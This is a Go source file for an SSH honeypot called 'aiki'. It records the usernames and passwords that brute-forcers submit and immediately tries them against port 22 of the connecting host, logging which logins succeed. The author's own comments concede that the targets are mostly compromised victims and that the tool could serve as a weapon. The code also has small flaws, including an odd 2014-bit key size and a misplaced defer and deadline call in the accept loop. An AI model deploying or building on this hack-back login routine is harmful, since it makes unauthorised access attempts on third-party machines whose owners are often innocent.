/*
Package aiki mimics an sshd, but uses any usernames and passwords attackers
try, to log back into the attacker. It does not request a shell but instead
all successful credentials for an attacker are logged.

Based on https://gist.github.com/jpillora/b480fde82bff51a06238/

Working thesis:
There are three types of SSH brute forcers with listening SSHd's out there:
1)   Machines with weak username/password combinations for their SSH users.
     These are the bots.
2)   Those who run ssh bruteforce scripts but do not use a strong password.
     These are the dumb ones.
3)   Those who have strong passwords (or use keys).
     These are the less dumb ones.

This script was made to discover the 1) attacker type. Please remember that
most or even all systems which are attacking you are victims themselves and
treat them as such. Like any physical object or piece of code in existence,
in the wrong hands this could be used as a weapon.

usage: go run aiki.go

*/
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/binary"
	"encoding/pem"
	"fmt"
	"github.com/kr/pty"
	"golang.org/x/crypto/ssh"
	"io"
	"log"
	"log/syslog"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)


func init() {
	// Logging into syslog instead of the stderr
	logwriter, e := syslog.New(syslog.LOG_NOTICE, "aiki")
	if e == nil {
        // disable double timestamping into syslog
        log.SetFlags(0)
        log.SetOutput(logwriter)
     }
}

// from https://raw.githubusercontent.com/golang-samples/cipher/master/crypto/rsa_keypair.go
func buildkeys() (priv_pem []byte) {
	priv, err := rsa.GenerateKey(rand.Reader, 2014)
	if err != nil {
		fmt.Println(err)
		return
	}
	err = priv.Validate()
	if err != nil {
		fmt.Println("Validation failed.", err)
	}

	// Get der format. priv_der []byte
	priv_der := x509.MarshalPKCS1PrivateKey(priv)

	// pem.Block
	// blk pem.Block
	priv_blk := pem.Block{
		Type:    "RSA PRIVATE KEY",
		Headers: nil,
		Bytes:   priv_der,
	}

	// Resultant private key in PEM format.
	// priv_pem string
	priv_pem = []byte(string(pem.EncodeToMemory(&priv_blk)))
	log.Printf("info:|Generated a transient SSH private key")
	return

}

// create non-bruteforcable account details
func unguessable() (username string, password string) {

	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		log.Printf("error:|%v", err)
		return
	}
	salt1 := strconv.FormatInt(time.Now().UTC().UnixNano(), 16)
	uuid1 := fmt.Sprintf("%s-%X-%X-%X-%X-%X", salt1, b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
	h1 := sha1.New()
	io.WriteString(h1, uuid1)
	username = fmt.Sprintf("%x", h1.Sum(nil))
	salt2 := strconv.FormatInt(time.Now().UTC().UnixNano(), 16)
	uuid2 := fmt.Sprintf("%s-%X-%X-%X-%X-%X", salt2, b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
	h2 := sha1.New()
	io.WriteString(h2, uuid2)
	password = fmt.Sprintf("%x", h2.Sum(nil))
	return
}

func aiki(ip string, gebruiker string, wachtwoord string) {
	// ssh client
	remoteaddress := strings.Split(ip, ":")
	sshConfig := &ssh.ClientConfig{
		User: string(gebruiker),
		Auth: []ssh.AuthMethod{ssh.Password(string(wachtwoord))},
		ClientVersion: "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1",
	}
	connection, err := ssh.Dial("tcp", remoteaddress[0]+":22", sshConfig)
	// serverversion := string(connection.ServerVersion())
	if err != nil {
		log.Printf("fail:|%s|%s|%s|%s", ip, gebruiker, string(wachtwoord), err)
		return
	}
	log.Printf("success:|%s|%s|%s", ip, gebruiker, string(wachtwoord))
	connection.Close() // Kill connection after success.
	return
}

func main() {
	const portnumber int = 2222
	username, password := unguessable()
	log.Printf("info:|username is %s , password is %s", username, password)

	config := &ssh.ServerConfig{
		//Define a function to run when a client attempts a password login
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			// XXX this is where the magic happens
			log.Printf("attempt:|%s|%s|%s|%s", c.RemoteAddr().String(),
				c.User(), string(pass), string(c.ClientVersion()))
			// go do the aiki
			go aiki(c.RemoteAddr().String(), c.User(), string(pass))
			// server code
			// We use long random username and pass here. for testing,
			// see the 'info:|' line in std.err
			if c.User() == username && string(pass) == password {
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q", c.User())
		},
		// fake another server type:
		ServerVersion: "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.7",
	}

	privkey := buildkeys()

	private, err := ssh.ParsePrivateKey(privkey)
	if err != nil {
		log.Fatal("Failed to parse private key")
	}

	config.AddHostKey(private)

	// Once a ServerConfig has been configured, connections can be accepted.
	// listenTCP only accepts a net.TCPAddr, not a string like listen does.
	// laddr := net.TCPAddr{IP: net.IPv4(0, 0, 0, 0), Port: portnumber} // Port == 0 - free port
	laddr := net.TCPAddr{IP: net.IPv4(127, 0, 0, 1), Port: portnumber} // Port == 0 - free port
	listener, err := net.ListenTCP("tcp", &laddr)
	if err != nil {
		log.Fatalf("error:|sshd failed to listen on port %d|%v", portnumber, err)
	}

	// Accept all connections
	log.Printf("info:|sshd listening on port %d", portnumber)
	for {
		tcpConn, err := listener.Accept()
		// CLOSE_WAIT issue. Adding a timeout:
		// http://felixge.de/2014/08/26/tcp-keepalive-with-golang.html
		// also, running out of file descriptors
		tcpConn.SetDeadline(time.Now().Add(50 * time.Second))
		// This is important, otherwise: CLOSE_WAITs
		defer tcpConn.Close()
		if err != nil {
			log.Printf("error:|tcpConn failed to accept incoming connection|%v", err)
			continue

		}

		// making it multithreaded: https://github.com/gogits/gogs/blob/ba93504804c6eff08cae095931befc35f5e5ddb2/modules/ssh/ssh.go
		// too many files open: https://ttboj.wordpress.com/2015/07/27/golang-parallelism-issues-causing-too-many-open-files-error/

		go func(tcpConn net.Conn) {
		// Before use, a handshake must be performed on the incoming net.Conn.
		sshConn, chans, reqs, err := ssh.NewServerConn(tcpConn, config)
		if err != nil {
				if err == io.EOF {
					log.Printf("error:|%s|sshConn handshaking terminated|%v", tcpConn.RemoteAddr().String(), err)
				} else {
					log.Printf("error:|%s|sshConn failed to handshake|%v", tcpConn.RemoteAddr().String(), err)
				}
				return
}

		log.Printf("error:|!!!New SSH connection from %s (%s)!!!",
			sshConn.RemoteAddr(), sshConn.ClientVersion())
		// Discard all global out-of-band Requests
		go ssh.DiscardRequests(reqs)
		// Accept all channels
		go handleChannels(chans)
	}(tcpConn)
	}
}

func handleChannels(chans <-chan ssh.NewChannel) {
	// Service the incoming Channel channel in go routine
	for newChannel := range chans {
		go handleChannel(newChannel)
	}
}

func handleChannel(newChannel ssh.NewChannel) {
	// Since we're supposed to be handling a shell, we expect a
	// channel type of "session". This also describes
	// "x11", "direct-tcpip" and "forwarded-tcpip"
	// channel types.
	if t := newChannel.ChannelType(); t != "session" {
		newChannel.Reject(ssh.UnknownChannelType,
			fmt.Sprintf("error:|unknown channel type"))
		return
	}

	// At this point, we have the opportunity to reject the client's
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		log.Printf("error:|could not accept channel (%v)", err)
		return
	}

	// If by any weird chance someone successfully authenticates,
	// serve them /bin/false
	// replace with /bin/bash for a real shell
	bash := exec.Command("/bin/false")

	// Prepare teardown function
	close := func() {
		connection.Close()
		_, err := bash.Process.Wait()
		if err != nil {
			log.Printf("error:|failed to exit /bin/false (%v)", err)
		}
		log.Printf("info:|Session closed")
	}

	// Allocate a terminal for this channel
	log.Print("info:|creating pty...")
	bashf, err := pty.Start(bash)
	if err != nil {
		// log.Printf("Could not start pty (%s)", err)
		close()
		return
	}

	//pipe session to bash and visa-versa
	var once sync.Once
	go func() {
		io.Copy(connection, bashf)
		once.Do(close)
	}()
	go func() {
		io.Copy(bashf, connection)
		once.Do(close)
	}()

	// Sessions have out-of-band requests such as "shell", "pty-req" and "env"
	go func() {
		for req := range requests {
			switch req.Type {
			case "shell":
				// We only accept the default shell
				// (i.e. no command in the Payload)
				if len(req.Payload) == 0 {
					req.Reply(true, nil)
				}
			case "pty-req":
				termLen := req.Payload[3]
				w, h := parseDims(req.Payload[termLen+4:])
				SetWinsize(bashf.Fd(), w, h)
				// Responding true (OK) here will let the client
				// know we have a pty ready for input
				req.Reply(true, nil)
			case "window-change":
				w, h := parseDims(req.Payload)
				SetWinsize(bashf.Fd(), w, h)
			}
		}
	}()
}

// =======================

// parseDims extracts terminal dimensions
// (width x height) from the provided buffer.
func parseDims(b []byte) (uint32, uint32) {
	w := binary.BigEndian.Uint32(b)
	h := binary.BigEndian.Uint32(b[4:])
	return w, h
}

// ======================
// Borrowed from https://github.com/creack/termios/blob/master/win/win.go

// Winsize stores the Height and Width of a terminal.
type Winsize struct {
	Height uint16
	Width  uint16
	x      uint16 // unused
	y      uint16 // unused
}

// SetWinsize sets the size of the given pty.
func SetWinsize(fd uintptr, w, h uint32) {
	ws := &Winsize{Width: uint16(w), Height: uint16(h)}
	syscall.Syscall(syscall.SYS_IOCTL, fd,
		uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))
}

